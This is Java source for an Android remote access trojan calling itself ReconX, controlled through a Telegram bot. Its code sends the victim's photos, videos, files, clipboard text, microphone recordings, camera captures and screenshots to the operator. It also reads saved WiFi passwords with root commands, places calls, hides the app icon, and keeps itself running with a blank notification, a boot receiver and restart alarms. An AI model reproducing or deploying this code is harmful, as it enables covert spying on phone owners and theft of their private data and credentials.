            if (shown > 0) kb.append(",");
            kb.append("[{\"text\":\"").append(escJson(lbl))
              .append("\",\"callback_data\":\"").append(cbd).append("\"}]");
            shown++;
        }
        if (files.length > 25) text.append("...and ").append(files.length-25).append(" more");
        kb.append("]}");
        sendWithButtons(text.toString(), chatId, kb.toString());
    }

    private void sendFileCmd(String path, String chatId) {
        File f = new File(path);
        if (f.exists() && f.isFile()) {
            sendText("📤 Sending: "+f.getName()+" ("+f.length()/1024+"KB)", chatId);
            int r = sendFile(f, f.getName(), chatId);
            if (r != 200) sendText("❌ Failed (code: "+r+")", chatId);
        } else { sendText("❌ Not found: "+path, chatId); }
    }

    // ── GALLERY ──────────────────────────────────
    void sendMedia(Uri uri, String sort, String dataCol, String nameCol,
                   int count, String chatId, String type) {
        try {
            Cursor c = getContentResolver().query(uri, new String[]{dataCol,nameCol},
                null, null, sort);
            if (c == null) { sendText("❌ No "+type+"s found", chatId); return; }
            sendText("📤 Sending "+type+"s...", chatId);
            int sent = 0;
            while (c.moveToNext() && sent < count) {
                String path = c.getString(0), name = c.getString(1);
                if (path == null) continue;
                File f = new File(path);
                if (!f.exists()) continue;
                if (sendFile(f, name!=null?name:f.getName(), chatId) == 200) sent++;
                try { Thread.sleep(400); } catch (Exception ignored) {}
            }
            c.close();
            sendText("✅ Sent "+sent+" "+type+"s", chatId);
        } catch (Exception e) { sendText("❌ Gallery: "+e.getMessage(), chatId); }
    }

    // ── SYSTEM ACTIONS ───────────────────────────
    @SuppressWarnings("NewApi")
    String setWallpaper(String url) {
        try {
            HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
            c.setConnectTimeout(30_000); c.setReadTimeout(60_000); c.connect();
            if (c.getResponseCode() != 200) return "❌ Download failed";
            WallpaperManager wm = WallpaperManager.getInstance(this);
            InputStream is = c.getInputStream();
            if (Build.VERSION.SDK_INT >= 24) {
                wm.setStream(is, null, true,
                    WallpaperManager.FLAG_SYSTEM | WallpaperManager.FLAG_LOCK);
            } else { wm.setStream(is); }
            is.close(); c.disconnect();
            return "🖼️ Wallpaper set (home + lock)";
        } catch (Exception e) { return "❌ Wallpaper: "+e.getMessage(); }
    }

    private void makeCall(String number, String chatId) {
        if (hasRoot()) {
            try {
                Runtime.getRuntime().exec(new String[]{"su","-c",
                    "am start -a android.intent.action.CALL -d tel:"+number}).waitFor();
                sendText("📞 Calling: "+number, chatId); return;
            } catch (Exception ignored) {}
        }
        try {
            Intent i = new Intent(Intent.ACTION_CALL);
            i.setData(Uri.parse("tel:"+number));
            i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(i);
            sendText("📞 Calling: "+number, chatId);
        } catch (Exception e) { sendText("❌ Call: "+e.getMessage(), chatId); }
    }

    private void hideIcon(String chatId) {
        try {
            getPackageManager().setComponentEnabledSetting(
                new ComponentName(this, MainActivity.class),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
            sendText("🙈 Icon hidden", chatId);
        } catch (Exception e) { sendText("❌ "+e.getMessage(), chatId); }
    }

    private void showIcon(String chatId) {
        try {
            getPackageManager().setComponentEnabledSetting(
                new ComponentName(this, MainActivity.class),
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP);
            sendText("👁️ Icon visible", chatId);
        } catch (Exception e) { sendText("❌ "+e.getMessage(), chatId); }
    }

    private void showToast(String msg, String chatId) {
        new Handler(Looper.getMainLooper()).post(new Runnable() {
            @Override public void run() {
                try {
                    android.widget.Toast.makeText(inq.this, msg,
                        android.widget.Toast.LENGTH_LONG).show();
                    sendText("💬 Toast: "+msg, chatId);
                } catch (Exception ignored) {}
            }
        });
    }

    private void getClipboard(String chatId) {
        new Handler(Looper.getMainLooper()).post(new Runnable() {
            @Override public void run() {
                try {
                    android.content.ClipboardManager cm =
                        (android.content.ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
                    if (cm != null && cm.hasPrimaryClip() && cm.getPrimaryClip() != null) {
                        CharSequence txt = cm.getPrimaryClip().getItemAt(0).getText();
                        sendText("📋 Clipboard\n\n"+(txt!=null?txt.toString():"(empty)"), chatId);
                    } else { sendText("📋 Clipboard empty", chatId); }
                } catch (Exception e) { sendText("❌ Clipboard: "+e.getMessage(), chatId); }
            }
        });
    }

    private void reboot(String chatId) {
        try {
            sendText("🔄 Rebooting...", chatId);
            Runtime.getRuntime().exec(new String[]{"su","-c","reboot"}).waitFor();
        } catch (Exception e) { sendText("❌ Reboot: "+e.getMessage(), chatId); }
    }

    private String getWifiPasswords() {
        String[] cmds = {
            "cat /data/misc/apexdata/com.android.wifi/WifiConfigStore.xml",
            "cat /data/misc/wifi/WifiConfigStore.xml",
            "cat /data/misc/wifi/wpa_supplicant.conf"
        };
        for (String cmd : cmds) {
            try {
                Process p = Runtime.getRuntime().exec(new String[]{"su","-c",cmd});
                BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
                StringBuilder sb = new StringBuilder("📶 WiFi Passwords\n\n");
                String line;
                while ((line = br.readLine()) != null) {
                    if (line.contains("SSID")||line.contains("PreSharedKey")
                        ||line.contains("ssid")||line.contains("psk"))
                        sb.append(line.trim()).append("\n");
                }
                p.waitFor();
                if (sb.length() > 20) return sb.toString();
            } catch (Exception ignored) {}
        }
        return "📶 WiFi passwords need root";
    }

    // ── SCREENSHOT ───────────────────────────────
    void takeScreenshot(String chatId) {
        File out = new File(getCacheDir(), "ss_"+System.currentTimeMillis()+".png");
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"su","-c",
                "screencap -p "+out.getAbsolutePath()
                +" && chmod 644 "+out.getAbsolutePath()});
            p.waitFor();
            if (out.exists() && out.length() > 100) {
                sendFile(out, "screenshot.png", chatId); out.delete();
            } else { out.delete(); sendText("❌ Screenshot needs root", chatId); }
        } catch (Exception e) { out.delete(); sendText("❌ Screenshot: "+e.getMessage(), chatId); }
    }

    // ── MIC ──────────────────────────────────────
    void recordMic(int secs, String chatId) {
        File out = new File(getCacheDir(), "mic_"+System.currentTimeMillis()+".3gp");
        MediaRecorder mr = null;
        try {
            sendText("🎤 Recording "+secs+"s...", chatId);
            mr = new MediaRecorder();
            mr.setAudioSource(MediaRecorder.AudioSource.MIC);
            mr.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            mr.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            mr.setOutputFile(out.getAbsolutePath());
            mr.prepare(); mr.start();
            Thread.sleep(secs * 1000L);
            mr.stop(); mr.release(); mr = null;
            sendFile(out, "mic_"+secs+"s.3gp", chatId);
            out.delete();
        } catch (Exception e) {
            if (mr != null) { try { mr.release(); } catch (Exception ignored) {} }
            out.delete(); sendText("❌ Mic: "+e.getMessage(), chatId);
        }
    }

    // ── CAMERA ───────────────────────────────────
    void captureCamera(boolean front, String chatId) {
        CameraManager cm = (CameraManager) getSystemService(CAMERA_SERVICE);
        if (cm == null) { sendText("❌ Camera unavailable", chatId); return; }
        HandlerThread ht = new HandlerThread("cam");
        ht.start();
        Handler handler = new Handler(ht.getLooper());
        File[] outFile = {null};
        CountDownLatch latch = new CountDownLatch(1);
        ImageReader reader = ImageReader.newInstance(1280, 720, ImageFormat.JPEG, 2);
        try {
            String[] ids = cm.getCameraIdList();
            String targetId = ids.length > 0 ? ids[0] : null;
            int want = front ? CameraCharacteristics.LENS_FACING_FRONT
                             : CameraCharacteristics.LENS_FACING_BACK;
            for (String id : ids) {
                Integer facing = cm.getCameraCharacteristics(id)
                    .get(CameraCharacteristics.LENS_FACING);
                if (facing != null && facing == want) { targetId = id; break; }
            }
            if (targetId == null) { sendText("❌ No camera found", chatId); ht.quit(); return; }
            // CamCallback handles ALL camera2 callbacks — no anonymous class here
            CamCallback cb = new CamCallback(this, chatId, handler, reader, latch, outFile);
            reader.setOnImageAvailableListener(cb, handler);
            cm.openCamera(targetId, cb, handler);
            latch.await(15, TimeUnit.SECONDS);
            if (outFile[0] != null && outFile[0].exists()) {
                sendFile(outFile[0], outFile[0].getName(), chatId);
                outFile[0].delete();
            } else { sendText("❌ Camera capture failed", chatId); }
        } catch (Exception e) { sendText("❌ Camera: "+e.getMessage(), chatId); }
        finally {
            try { reader.close(); } catch (Exception ignored) {}
            ht.quit();
        }
    }

    // ── FLASHLIGHT ───────────────────────────────
    @SuppressWarnings("NewApi")
    private String toggleFlashlight(boolean on) {
        if (Build.VERSION.SDK_INT < 23) return "❌ Requires Android 6+";
        try {
            CameraManager cm = (CameraManager) getSystemService(CAMERA_SERVICE);
            if (cm == null) return "❌ Unavailable";
            for (String id : cm.getCameraIdList()) {
                Boolean hasFlash = cm.getCameraCharacteristics(id)
                    .get(CameraCharacteristics.FLASH_INFO_AVAILABLE);
                Integer facing = cm.getCameraCharacteristics(id)
                    .get(CameraCharacteristics.LENS_FACING);
                if (hasFlash!=null&&hasFlash&&facing!=null
                        &&facing==CameraCharacteristics.LENS_FACING_BACK) {
                    cm.setTorchMode(id, on);
                    return on ? "🔦 Flashlight ON" : "🔦 Flashlight OFF";
                }
            }
            return "❌ No flashlight";
        } catch (Exception e) { return "❌ Flashlight: "+e.getMessage(); }
    }

    // ── HELP ─────────────────────────────────────
    private String getHelp() {
        return "📋 ReconX v1.1.1\n\n"
            + "/info  /gmail  /battery\n"
            + "/net  /usage  /storage\n"
            + "/apk  /running  /newapps\n"
            + "/sms [n]  /calls [n]\n"
            + "/contacts  /loc\n"
            + "/browser  /wifipass\n"
            + "/ls [path]  /get [path]\n"
            + "/photos [n/all]\n"
            + "/videos [n/all]\n"
            + "/wallpaper [url]\n"
            + "/call [number]\n"
            + "/hide  /show\n"
            + "/toast [msg]  /clipboard\n"
            + "/screen  /mic [secs]\n"
            + "/cam [f/b]\n"
            + "/flashlight [on/off]\n"
            + "/reboot";
    }

    // ── PERSISTENCE (Always Active) ──────────────
    @SuppressWarnings("NewApi")
    private void scheduleRestart(long delayMs) {
        try {
            android.app.AlarmManager am = (android.app.AlarmManager) getSystemService(ALARM_SERVICE);
            if (am == null) return;
            int flags = Build.VERSION.SDK_INT >= 23
                ? PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
                : PendingIntent.FLAG_UPDATE_CURRENT;
            PendingIntent pi = PendingIntent.getService(this, 1, new Intent(this, inq.class), flags);
            long trigger = SystemClock.elapsedRealtime() + delayMs;
            if (Build.VERSION.SDK_INT >= 23)
                am.setAndAllowWhileIdle(android.app.AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
            else if (Build.VERSION.SDK_INT >= 19)
                am.setExact(android.app.AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
            else
                am.set(android.app.AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
        } catch (Exception ignored) {}
    }

    // ── SILENT FOREGROUND ────────────────────────
    @SuppressWarnings({"NewApi","deprecation"})
    private void silentForeground() {
        NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        if (Build.VERSION.SDK_INT >= 26 && nm != null) {
            NotificationChannel ch = new NotificationChannel(
                "rc", "System", NotificationManager.IMPORTANCE_MIN);
            ch.setShowBadge(false); ch.setSound(null, null);
            nm.createNotificationChannel(ch);
        }
        Notification notif;
        if (Build.VERSION.SDK_INT >= 26) {
            notif = new Notification.Builder(this,"rc")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .setContentTitle(" ").setContentText(" ").build();
        } else {
            notif = new Notification.Builder(this)
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .setContentTitle(" ").setContentText(" ")
                .setPriority(Notification.PRIORITY_MIN).build();
        }
        if (Build.VERSION.SDK_INT >= 29)
            startForeground(2, notif, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
        else
            startForeground(2, notif);
    }

    // ── TELEGRAM API ─────────────────────────────
    void sendText(String text, String chatId) {
        if (text.length() > 4000) {
            sendText(text.substring(0,4000), chatId);
            sendText(text.substring(4000), chatId); return;
        }
        try {
            HttpURLConnection c = (HttpURLConnection)
                new URL("https://api.telegram.org/bot"+BOT_TOKEN+"/sendMessage").openConnection();
            c.setRequestMethod("POST"); c.setDoOutput(true);
            c.setConnectTimeout(15_000); c.setReadTimeout(15_000);
            c.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
            byte[] body = ("chat_id="+chatId+"&text="+encode(text)).getBytes("UTF-8");
            OutputStream os = c.getOutputStream(); os.write(body); os.close();
            c.getResponseCode(); c.disconnect();
        } catch (Exception ignored) {}
    }

    private void sendWithButtons(String text, String chatId, String markup) {
        if (text.length() > 4000) { sendText(text, chatId); return; }
        try {
            HttpURLConnection c = (HttpURLConnection)
                new URL("https://api.telegram.org/bot"+BOT_TOKEN+"/sendMessage").openConnection();
            c.setRequestMethod("POST"); c.setDoOutput(true);
            c.setConnectTimeout(15_000); c.setReadTimeout(15_000);
            c.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
            byte[] body = ("chat_id="+chatId+"&text="+encode(text)
                +"&reply_markup="+encode(markup)).getBytes("UTF-8");
            OutputStream os = c.getOutputStream(); os.write(body); os.close();
            c.getResponseCode(); c.disconnect();
        } catch (Exception ignored) { sendText(text, chatId); }
    }

    int sendFile(File file, String filename, String chatId) {
        try {
            String bound = "RX"+System.currentTimeMillis();
            HttpURLConnection c = (HttpURLConnection)
                new URL("https://api.telegram.org/bot"+BOT_TOKEN+"/sendDocument").openConnection();
            c.setRequestMethod("POST"); c.setDoOutput(true);
            c.setConnectTimeout(30_000); c.setReadTimeout(180_000);
            c.setRequestProperty("Content-Type","multipart/form-data; boundary="+bound);
            DataOutputStream out = new DataOutputStream(c.getOutputStream());
            out.writeBytes("--"+bound+"\r\n");
            out.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
            out.writeBytes(chatId+"\r\n");
            out.writeBytes("--"+bound+"\r\n");
            out.writeBytes("Content-Disposition: form-data; name=\"document\"; filename=\""
                +filename+"\"\r\n");
            out.writeBytes("Content-Type: application/octet-stream\r\n\r\n");
            FileInputStream fis = new FileInputStream(file);
            byte[] buf = new byte[16384]; int n;
            while ((n = fis.read(buf)) != -1) out.write(buf, 0, n);
            fis.close();
            out.writeBytes("\r\n--"+bound+"--\r\n");
            out.flush(); out.close();
            int code = c.getResponseCode(); c.disconnect(); return code;
        } catch (Exception e) { return -1; }
    }

    private void answerCallback(String cbId) {
        try {
            HttpURLConnection c = (HttpURLConnection)
                new URL("https://api.telegram.org/bot"+BOT_TOKEN+"/answerCallbackQuery").openConnection();
            c.setRequestMethod("POST"); c.setDoOutput(true);
            c.setConnectTimeout(10_000); c.setReadTimeout(10_000);
            c.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
            OutputStream os = c.getOutputStream();
            os.write(("callback_query_id="+cbId).getBytes("UTF-8"));
            os.close(); c.getResponseCode(); c.disconnect();
        } catch (Exception ignored) {}
    }

    // ── HELPERS ──────────────────────────────────
    private boolean hasRoot() {
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"su","-c","id"});
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line = br.readLine(); br.close(); p.waitFor();
            return line != null && line.contains("uid=0");
        } catch (Exception e) { return false; }
    }

    private String encode(String s) {
        try { return java.net.URLEncoder.encode(s,"UTF-8"); }
        catch (Exception e) { return s; }
    }

    private int arg(String cmd, int def) {
        String[] p = cmd.split(" ");
        if (p.length > 1) { try { return Integer.parseInt(p[1]); } catch (Exception ignored) {} }
        return def;
    }

    private String argStr(String cmd, String def) {
        String[] p = cmd.split(" ");
        return p.length > 1 ? p[1] : def;
    }

    int safeInt(String s, int def) {
        try { return Integer.parseInt(s); } catch (Exception e) { return def; }
    }

    private String truncate(String s, int max) {
        return s.length() > max ? s.substring(0, max) + "…" : s;
    }

    private String escJson(String s) {
        return s.replace("\\","\\\\").replace("\"","\\\"");
    }

    // ── BOOT RECEIVER ────────────────────────────
    public static class BootReceiver extends BroadcastReceiver {
        @SuppressWarnings("NewApi")
        @Override
        public void onReceive(Context ctx, Intent intent) {
            if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
                Intent svc = new Intent(ctx, inq.class);
                if (Build.VERSION.SDK_INT >= 26) ctx.startForegroundService(svc);
                else ctx.startService(svc);
            }
        }
    }
}
